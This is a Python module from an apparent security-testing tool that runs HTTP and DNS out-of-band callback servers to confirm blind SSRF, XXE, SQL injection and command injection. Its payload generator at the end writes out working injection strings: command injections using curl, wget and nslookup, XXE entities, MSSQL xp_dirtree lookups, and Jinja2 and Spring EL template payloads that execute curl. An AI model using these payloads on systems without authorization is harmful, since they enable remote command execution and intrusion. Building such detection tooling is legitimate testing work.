"""
AIPTX Out-of-Band Callback Server for Blind Vulnerability Detection

Provides HTTP and DNS callback endpoints for validating:
- Blind SSRF
- Blind XXE
- Blind SQLi (via DNS exfiltration)
- Blind Command Injection (via HTTP callback)
- OOB (Out-of-Band) data exfiltration

Features:
- Async HTTP callback server using aiohttp
- Unique callback ID generation
- Timeout-based waiting with asyncio.Event
- Request capture and correlation
- Optional Interactsh integration

Usage:
    from aipt_v2.validation.callback_server import CallbackManager

    async with CallbackManager(http_port=8888) as manager:
        # Generate unique callback URL
        callback_url, callback_id = manager.generate_callback_url(
            vuln_type="ssrf",
            finding_id="abc123"
        )

        # Use callback_url in your payload...
        payload = f"http://vulnerable.com/?url={callback_url}"

        # Wait for callback
        result = await manager.wait_for_callback(callback_id, timeout=30.0)
        if result:
            print(f"OOB callback received from {result.source_ip}")
"""

from __future__ import annotations

import asyncio
import logging
import socket
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Optional

logger = logging.getLogger(__name__)

# Try to import aiohttp, fallback gracefully
try:
    from aiohttp import web
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    web = None


@dataclass
class CallbackResult:
    """Result from a received callback."""
    callback_id: str
    callback_type: str  # "http" or "dns"
    received_at: datetime
    source_ip: str
    request_data: dict  # Headers, body, query for HTTP; query name for DNS
    raw_request: str

    def to_dict(self) -> dict:
        """Convert to dictionary for serialization."""
        return {
            "callback_id": self.callback_id,
            "callback_type": self.callback_type,
            "received_at": self.received_at.isoformat(),
            "source_ip": self.source_ip,
            "request_data": self.request_data,
            "raw_request": self.raw_request[:2000],  # Truncate for storage
        }


@dataclass
class PendingCallback:
    """Pending callback awaiting response."""
    callback_id: str
    created_at: datetime
    timeout: float
    event: asyncio.Event
    result: Optional[CallbackResult] = None
    vuln_type: str = ""
    finding_id: str = ""


class HTTPCallbackServer:
    """
    HTTP callback server for OOB detection.

    Creates an async HTTP server that listens for incoming requests
    and correlates them with pending callbacks.

    Usage:
        server = HTTPCallbackServer(port=8888, host="0.0.0.0")
        callback_url = await server.start()

        # Generate unique callback ID
        callback_id = server.generate_callback_id()
        full_url = f"{callback_url}/{callback_id}"

        # Wait for callback
        result = await server.wait_for_callback(callback_id, timeout=30.0)
        if result:
            print(f"Callback received from {result.source_ip}")
    """

    def __init__(
        self,
        port: int = 8888,
        host: str = "0.0.0.0",
        external_host: Optional[str] = None,
    ):
        """
        Initialize HTTP callback server.

        Args:
            port: Port to listen on
            host: Host to bind to
            external_host: External hostname/IP for callback URLs
        """
        self.port = port
        self.host = host
        self.external_host = external_host
        self._app: Optional[Any] = None
        self._runner: Optional[Any] = None
        self._site: Optional[Any] = None
        self._pending: dict[str, PendingCallback] = {}
        self._callbacks: list[CallbackResult] = []
        self._on_callback: Optional[Callable] = None
        self._started = False

    async def start(self) -> str:
        """
        Start HTTP callback server and return base URL.

        Returns:
            Base URL for generating callback endpoints
        """
        if not AIOHTTP_AVAILABLE:
            logger.warning("aiohttp not available, callback server disabled")
            return f"http://{self.external_host or 'localhost'}:{self.port}"

        if self._started:
            return self._get_base_url()

        self._app = web.Application()
        self._app.router.add_route("*", "/{callback_id}", self._handle_callback)
        self._app.router.add_route("*", "/{callback_id}/{path:.*}", self._handle_callback)
        self._app.router.add_route("*", "/", self._handle_root)

        self._runner = web.AppRunner(self._app)
        await self._runner.setup()

        try:
            self._site = web.TCPSite(self._runner, self.host, self.port)
            await self._site.start()
            self._started = True

            base_url = self._get_base_url()
            logger.info(f"HTTP Callback server started at {base_url}")
            return base_url

        except OSError as e:
            logger.error(f"Failed to start callback server on port {self.port}: {e}")
            # Try alternate port
            self.port = self._find_available_port()
            self._site = web.TCPSite(self._runner, self.host, self.port)
            await self._site.start()
            self._started = True

            base_url = self._get_base_url()
            logger.info(f"HTTP Callback server started at {base_url} (alternate port)")
            return base_url

    def _find_available_port(self) -> int:
        """Find an available port."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]

    def _get_base_url(self) -> str:
        """Get the base URL for callbacks."""
        host = self.external_host or self._get_local_ip()
        return f"http://{host}:{self.port}"

    def _get_local_ip(self) -> str:
        """Get local IP address for external connections."""
        try:
            # Connect to a public IP to determine local IP
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

    async def stop(self):
        """Stop the callback server."""
        if self._runner and self._started:
            await self._runner.cleanup()
            self._started = False
            logger.info("HTTP Callback server stopped")

    def generate_callback_id(self) -> str:
        """Generate unique callback identifier."""
        return f"cb-{uuid.uuid4().hex[:16]}"

    def register_pending(
        self,
        callback_id: str,
        timeout: float = 30.0,
        vuln_type: str = "",
        finding_id: str = "",
    ) -> PendingCallback:
        """
        Register a pending callback to wait for.

        Args:
            callback_id: Unique callback identifier
            timeout: Maximum wait time in seconds
            vuln_type: Vulnerability type being tested
            finding_id: Associated finding ID

        Returns:
            PendingCallback object
        """
        pending = PendingCallback(
            callback_id=callback_id,
            created_at=datetime.now(),
            timeout=timeout,
            event=asyncio.Event(),
            vuln_type=vuln_type,
            finding_id=finding_id,
        )
        self._pending[callback_id] = pending
        return pending

    async def wait_for_callback(
        self,
        callback_id: str,
        timeout: float = 30.0,
    ) -> Optional[CallbackResult]:
        """
        Wait for a specific callback with timeout.

        Args:
            callback_id: Unique callback identifier
            timeout: Maximum wait time in seconds

        Returns:
            CallbackResult if received, None if timeout
        """
        pending = self._pending.get(callback_id)
        if not pending:
            pending = self.register_pending(callback_id, timeout)

        try:
            await asyncio.wait_for(pending.event.wait(), timeout=timeout)
            return pending.result
        except asyncio.TimeoutError:
            logger.debug(f"Callback {callback_id} timed out after {timeout}s")
            return None
        finally:
            self._pending.pop(callback_id, None)

    async def _handle_root(self, request: web.Request) -> web.Response:
        """Handle root requests."""
        return web.Response(
            text="AIPTX Callback Server",
            status=200,
        )

    async def _handle_callback(self, request: web.Request) -> web.Response:
        """Handle incoming callback request."""
        callback_id = request.match_info.get("callback_id", "unknown")
        path_extra = request.match_info.get("path", "")

        # Capture request details
        try:
            body = await request.text()
        except Exception:
            body = ""

        result = CallbackResult(
            callback_id=callback_id,
            callback_type="http",
            received_at=datetime.now(),
            source_ip=request.remote or "unknown",
            request_data={
                "method": request.method,
                "path": str(request.path),
                "path_extra": path_extra,
                "query": dict(request.query),
                "headers": dict(request.headers),
                "body": body[:4096],  # Limit body size
                "content_type": request.content_type,
            },
            raw_request=f"{request.method} {request.path}\n{dict(request.headers)}\n\n{body[:1024]}",
        )

        self._callbacks.append(result)
        logger.info(f"Received callback: {callback_id} from {result.source_ip}")

        # Notify pending waiters
        if callback_id in self._pending:
            pending = self._pending[callback_id]
            pending.result = result
            pending.event.set()

        # Invoke callback handler
        if self._on_callback:
            try:
                if asyncio.iscoroutinefunction(self._on_callback):
                    await self._on_callback(result)
                else:
                    self._on_callback(result)
            except Exception as e:
                logger.warning(f"Callback handler error: {e}")

        # Return success response
        return web.Response(
            text="OK",
            status=200,
            headers={"X-Callback-ID": callback_id},
        )

    def on_callback(self, handler: Callable):
        """
        Register callback notification handler.

        Args:
            handler: Function called when callback received
        """
        self._on_callback = handler

    def get_all_callbacks(self) -> list[CallbackResult]:
        """Get all received callbacks."""
        return self._callbacks.copy()

    def clear_callbacks(self):
        """Clear callback history."""
        self._callbacks.clear()

    def get_pending_count(self) -> int:
        """Get count of pending callbacks."""
        return len(self._pending)


class DNSCallbackServer:
    """
    DNS callback server for OOB detection via DNS queries.

    Listens for DNS queries containing callback IDs as subdomains.

    Note: Requires elevated privileges (root/admin) to bind to port 53.
    For development, use higher ports (e.g., 5353) with DNS forwarding.

    Usage:
        server = DNSCallbackServer(port=5353, domain="callback.local")
        await server.start()

        # Generate callback URL
        callback_id = server.generate_callback_id()
        dns_name = f"{callback_id}.callback.local"

        # Use in payload (e.g., XXE)
        payload = f'<!ENTITY xxe SYSTEM "http://{dns_name}/test">'

        # Wait for DNS query
        result = await server.wait_for_callback(callback_id, timeout=30.0)
    """

    def __init__(
        self,
        port: int = 5353,
        host: str = "0.0.0.0",
        domain: str = "callback.aiptx.local",
    ):
        """
        Initialize DNS callback server.

        Args:
            port: Port to listen on (53 requires root)
            host: Host to bind to
            domain: Base domain for callbacks
        """
        self.port = port
        self.host = host
        self.domain = domain
        self._pending: dict[str, PendingCallback] = {}
        self._callbacks: list[CallbackResult] = []
        self._transport: Optional[Any] = None
        self._protocol: Optional[Any] = None
        self._started = False

    async def start(self) -> str:
        """Start DNS callback server."""
        try:
            loop = asyncio.get_event_loop()

            # Create UDP server for DNS
            self._transport, self._protocol = await loop.create_datagram_endpoint(
                lambda: DNSProtocol(self),
                local_addr=(self.host, self.port),
            )
            self._started = True

            logger.info(f"DNS Callback server started on {self.host}:{self.port}")
            return f"*.{self.domain}"

        except PermissionError:
            logger.warning(f"Cannot bind to port {self.port} - need elevated privileges")
            return ""
        except Exception as e:
            logger.error(f"Failed to start DNS callback server: {e}")
            return ""

    async def stop(self):
        """Stop DNS callback server."""
        if self._transport:
            self._transport.close()
            self._started = False
            logger.info("DNS Callback server stopped")

    def generate_callback_id(self) -> str:
        """Generate unique callback identifier."""
        return f"dns-{uuid.uuid4().hex[:12]}"

    def get_callback_domain(self, callback_id: str) -> str:
        """Get full domain name for callback."""
        return f"{callback_id}.{self.domain}"

    def register_pending(
        self,
        callback_id: str,
        timeout: float = 30.0,
        vuln_type: str = "",
        finding_id: str = "",
    ) -> PendingCallback:
        """Register a pending DNS callback."""
        pending = PendingCallback(
            callback_id=callback_id,
            created_at=datetime.now(),
            timeout=timeout,
            event=asyncio.Event(),
            vuln_type=vuln_type,
            finding_id=finding_id,
        )
        self._pending[callback_id] = pending
        return pending

    async def wait_for_callback(
        self,
        callback_id: str,
        timeout: float = 30.0,
    ) -> Optional[CallbackResult]:
        """Wait for DNS callback."""
        pending = self._pending.get(callback_id)
        if not pending:
            pending = self.register_pending(callback_id, timeout)

        try:
            await asyncio.wait_for(pending.event.wait(), timeout=timeout)
            return pending.result
        except asyncio.TimeoutError:
            return None
        finally:
            self._pending.pop(callback_id, None)

    def handle_dns_query(
        self,
        query_name: str,
        source_ip: str,
        query_type: str,
    ):
        """Handle received DNS query."""
        # Extract callback ID from subdomain
        callback_id = None
        if self.domain in query_name:
            parts = query_name.replace(self.domain, "").strip(".").split(".")
            if parts and parts[-1]:
                callback_id = parts[-1]

        if not callback_id:
            return

        result = CallbackResult(
            callback_id=callback_id,
            callback_type="dns",
            received_at=datetime.now(),
            source_ip=source_ip,
            request_data={
                "query_name": query_name,
                "query_type": query_type,
            },
            raw_request=f"DNS {query_type} {query_name}",
        )

        self._callbacks.append(result)
        logger.info(f"DNS callback: {callback_id} from {source_ip} ({query_name})")

        # Notify pending waiters
        if callback_id in self._pending:
            pending = self._pending[callback_id]
            pending.result = result
            pending.event.set()


class DNSProtocol(asyncio.DatagramProtocol):
    """UDP protocol handler for DNS queries."""

    def __init__(self, server: DNSCallbackServer):
        self.server = server

    def datagram_received(self, data: bytes, addr: tuple):
        """Handle received DNS packet."""
        try:
            # Simple DNS query parsing (minimal implementation)
            # Full implementation would use dnslib
            if len(data) < 12:
                return

            # Skip header (12 bytes), parse question section
            pos = 12
            labels = []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    break
                pos += 1
                labels.append(data[pos:pos + length].decode('ascii', errors='ignore'))
                pos += length

            query_name = ".".join(labels)
            source_ip = addr[0]

            self.server.handle_dns_query(query_name, source_ip, "A")

        except Exception as e:
            logger.debug(f"DNS parse error: {e}")


class InteractshClient:
    """
    Client for Interactsh (OAST - Out-of-band Application Security Testing).

    Provides integration with Interactsh servers for reliable OOB detection
    without running your own callback server.

    Usage:
        client = InteractshClient()
        await client.register()

        # Get unique callback URL
        callback_url = client.get_callback_url("ssrf-test")

        # Poll for interactions
        interactions = await client.poll()
    """

    DEFAULT_SERVER = "oast.fun"

    def __init__(
        self,
        server: str = DEFAULT_SERVER,
        token: Optional[str] = None,
    ):
        """
        Initialize Interactsh client.

        Args:
            server: Interactsh server domain
            token: Optional authentication token
        """
        self.server = server
        self.token = token
        self._registered = False
        self._correlation_id: Optional[str] = None
        self._secret_key: Optional[bytes] = None

    async def register(self) -> bool:
        """
        Register with Interactsh server.

        Returns:
            True if registration successful
        """
        try:
            import aiohttp

            # Generate correlation ID and secret
            self._correlation_id = uuid.uuid4().hex[:20]
            self._secret_key = uuid.uuid4().bytes

            async with aiohttp.ClientSession() as session:
                url = f"https://{self.server}/register"
                data = {
                    "public-key": self._correlation_id,
                    "secret-key": self._secret_key.hex(),
                }

                async with session.post(url, json=data) as resp:
                    if resp.status == 200:
                        self._registered = True
                        logger.info(f"Registered with Interactsh: {self.server}")
                        return True

            return False

        except ImportError:
            logger.warning("aiohttp required for Interactsh")
            return False
        except Exception as e:
            logger.error(f"Interactsh registration failed: {e}")
            return False

    def get_callback_url(self, identifier: str = "") -> str:
        """
        Get unique callback URL.

        Args:
            identifier: Optional identifier for this callback

        Returns:
            Callback URL
        """
        if not self._registered or not self._correlation_id:
            return ""

        unique_id = f"{identifier}-{uuid.uuid4().hex[:8]}" if identifier else uuid.uuid4().hex[:8]
        return f"http://{unique_id}.{self._correlation_id}.{self.server}"

    async def poll(self, timeout: float = 5.0) -> list[dict]:
        """
        Poll for interactions.

        Args:
            timeout: Poll timeout in seconds

        Returns:
            List of interaction records
        """
        if not self._registered:
            return []

        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                url = f"https://{self.server}/poll"
                params = {
                    "id": self._correlation_id,
                    "secret": self._secret_key.hex() if self._secret_key else "",
                }

                async with session.get(url, params=params, timeout=timeout) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return data.get("data", [])

            return []

        except Exception as e:
            logger.debug(f"Interactsh poll error: {e}")
            return []

    async def deregister(self):
        """Deregister from Interactsh server."""
        if not self._registered:
            return

        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                url = f"https://{self.server}/deregister"
                data = {
                    "correlation-id": self._correlation_id,
                    "secret-key": self._secret_key.hex() if self._secret_key else "",
                }

                await session.post(url, json=data)
                self._registered = False
                logger.info("Deregistered from Interactsh")

        except Exception:
            pass


class CallbackManager:
    """
    Unified callback manager for OOB detection.

    Manages HTTP and DNS callback servers, plus optional Interactsh integration.
    Provides a single interface for generating callback URLs and waiting for
    callbacks from blind vulnerability testing.

    Usage:
        async with CallbackManager(http_port=8888) as manager:
            # Generate callback URL
            url, callback_id = manager.generate_callback_url(
                vuln_type="ssrf",
                finding_id="abc123",
            )

            # Use in payload
            payload = f"http://target.com/?url={url}"

            # Wait for callback
            result = await manager.wait_for_callback(callback_id, timeout=30)
            if result:
                print(f"OOB callback confirmed from {result.source_ip}")

    Advanced usage with Interactsh:
        manager = CallbackManager(use_interactsh=True)
        await manager.start()

        # Interactsh provides reliable external callbacks
        url, callback_id = manager.generate_callback_url()
    """

    def __init__(
        self,
        http_port: int = 8888,
        http_host: str = "0.0.0.0",
        external_host: Optional[str] = None,
        enable_dns: bool = False,
        dns_port: int = 5353,
        dns_domain: str = "callback.aiptx.local",
        use_interactsh: bool = False,
        interactsh_server: str = "oast.fun",
    ):
        """
        Initialize callback manager.

        Args:
            http_port: HTTP server port
            http_host: HTTP server host
            external_host: External hostname for callback URLs
            enable_dns: Enable DNS callback server
            dns_port: DNS server port
            dns_domain: DNS callback domain
            use_interactsh: Use Interactsh for external callbacks
            interactsh_server: Interactsh server domain
        """
        self.http_server = HTTPCallbackServer(
            port=http_port,
            host=http_host,
            external_host=external_host,
        )

        self.dns_server: Optional[DNSCallbackServer] = None
        if enable_dns:
            self.dns_server = DNSCallbackServer(
                port=dns_port,
                domain=dns_domain,
            )

        self.interactsh: Optional[InteractshClient] = None
        if use_interactsh:
            self.interactsh = InteractshClient(server=interactsh_server)

        self._base_url: Optional[str] = None
        self._started = False

    async def start(self) -> str:
        """
        Start callback infrastructure.

        Returns:
            Base callback URL
        """
        # Start HTTP server
        self._base_url = await self.http_server.start()

        # Start DNS server if enabled
        if self.dns_server:
            await self.dns_server.start()

        # Register with Interactsh if enabled
        if self.interactsh:
            await self.interactsh.register()

        self._started = True
        return self._base_url

    async def stop(self):
        """Stop all callback servers."""
        await self.http_server.stop()

        if self.dns_server:
            await self.dns_server.stop()

        if self.interactsh:
            await self.interactsh.deregister()

        self._started = False

    def generate_callback_url(
        self,
        vuln_type: str = "",
        finding_id: str = "",
        callback_type: str = "http",
    ) -> tuple[str, str]:
        """
        Generate a unique callback URL.

        Args:
            vuln_type: Vulnerability type being tested
            finding_id: Associated finding ID
            callback_type: Type of callback ("http", "dns", "interactsh")

        Returns:
            Tuple of (callback_url, callback_id)
        """
        if callback_type == "interactsh" and self.interactsh:
            callback_id = f"int-{uuid.uuid4().hex[:12]}"
            url = self.interactsh.get_callback_url(callback_id)
            return url, callback_id

        elif callback_type == "dns" and self.dns_server:
            callback_id = self.dns_server.generate_callback_id()
            self.dns_server.register_pending(
                callback_id,
                vuln_type=vuln_type,
                finding_id=finding_id,
            )
            url = self.dns_server.get_callback_domain(callback_id)
            return url, callback_id

        else:
            # Default to HTTP
            callback_id = self.http_server.generate_callback_id()
            self.http_server.register_pending(
                callback_id,
                vuln_type=vuln_type,
                finding_id=finding_id,
            )
            return f"{self._base_url}/{callback_id}", callback_id

    async def wait_for_callback(
        self,
        callback_id: str,
        timeout: float = 30.0,
        callback_type: str = "http",
    ) -> Optional[CallbackResult]:
        """
        Wait for callback with given ID.

        Args:
            callback_id: Callback identifier
            timeout: Maximum wait time in seconds
            callback_type: Type of callback to wait for

        Returns:
            CallbackResult if received, None if timeout
        """
        if callback_type == "interactsh" and self.interactsh:
            # Poll Interactsh for interactions
            start_time = asyncio.get_event_loop().time()
            while asyncio.get_event_loop().time() - start_time < timeout:
                interactions = await self.interactsh.poll()
                for interaction in interactions:
                    if callback_id in str(interaction):
                        return CallbackResult(
                            callback_id=callback_id,
                            callback_type="interactsh",
                            received_at=datetime.now(),
                            source_ip=interaction.get("remote-address", "unknown"),
                            request_data=interaction,
                            raw_request=str(interaction),
                        )
                await asyncio.sleep(1)
            return None

        elif callback_type == "dns" and self.dns_server:
            return await self.dns_server.wait_for_callback(callback_id, timeout)

        else:
            return await self.http_server.wait_for_callback(callback_id, timeout)

    def get_all_callbacks(self) -> list[CallbackResult]:
        """Get all received callbacks from all sources."""
        callbacks = self.http_server.get_all_callbacks()

        if self.dns_server:
            callbacks.extend(self.dns_server._callbacks)

        return callbacks

    def get_statistics(self) -> dict:
        """Get callback statistics."""
        return {
            "http_callbacks_received": len(self.http_server._callbacks),
            "http_pending_count": self.http_server.get_pending_count(),
            "dns_enabled": self.dns_server is not None,
            "dns_callbacks_received": len(self.dns_server._callbacks) if self.dns_server else 0,
            "interactsh_enabled": self.interactsh is not None,
            "interactsh_registered": self.interactsh._registered if self.interactsh else False,
        }

    async def __aenter__(self):
        """Async context manager entry."""
        await self.start()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        await self.stop()


# Convenience functions

async def create_callback_server(
    port: int = 8888,
    external_host: Optional[str] = None,
) -> CallbackManager:
    """
    Create and start a callback server.

    Args:
        port: HTTP port to use
        external_host: External hostname for callbacks

    Returns:
        Started CallbackManager instance
    """
    manager = CallbackManager(http_port=port, external_host=external_host)
    await manager.start()
    return manager


def generate_oob_payloads(
    callback_url: str,
    vuln_type: str,
) -> list[tuple[str, str]]:
    """
    Generate OOB payloads for various vulnerability types.

    Args:
        callback_url: Callback URL to embed in payloads
        vuln_type: Vulnerability type

    Returns:
        List of (payload, description) tuples
    """
    payloads = []

    if vuln_type in ("ssrf", "SSRF"):
        payloads.extend([
            (callback_url, "direct_url"),
            (f"http://test@{callback_url.replace('http://', '')}", "userinfo_bypass"),
            (f"{callback_url}?test=1", "with_query"),
        ])

    elif vuln_type in ("xxe", "XXE"):
        payloads.extend([
            (f'<!ENTITY xxe SYSTEM "{callback_url}">', "xxe_entity"),
            (f'<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;', "xxe_param_entity"),
            (f'<xi:include href="{callback_url}"/>', "xinclude"),
        ])

    elif vuln_type in ("sql_injection", "sqli", "blind_sqli"):
        # DNS exfiltration payloads (MySQL, MSSQL, Oracle)
        domain = callback_url.replace("http://", "").replace("https://", "").split("/")[0]
        payloads.extend([
            (f"'; SELECT LOAD_FILE('\\\\\\\\{domain}\\\\test');-- ", "mysql_unc"),
            (f"'; exec master..xp_dirtree '\\\\{domain}\\test';-- ", "mssql_xp_dirtree"),
        ])

    elif vuln_type in ("command_injection", "cmd", "rce"):
        domain = callback_url.replace("http://", "").replace("https://", "").split("/")[0]
        payloads.extend([
            (f"; curl {callback_url}", "curl_callback"),
            (f"; wget {callback_url}", "wget_callback"),
            (f"; nslookup {domain}", "nslookup_callback"),
            (f"| curl {callback_url}", "pipe_curl"),
        ])

    elif vuln_type in ("ssti", "SSTI"):
        payloads.extend([
            (f'{{{{config.__class__.__init__.__globals__["os"].popen("curl {callback_url}").read()}}}}', "jinja2_rce"),
            (f'${{T(java.lang.Runtime).getRuntime().exec("curl {callback_url}")}}', "spring_el"),
        ])

    return payloads
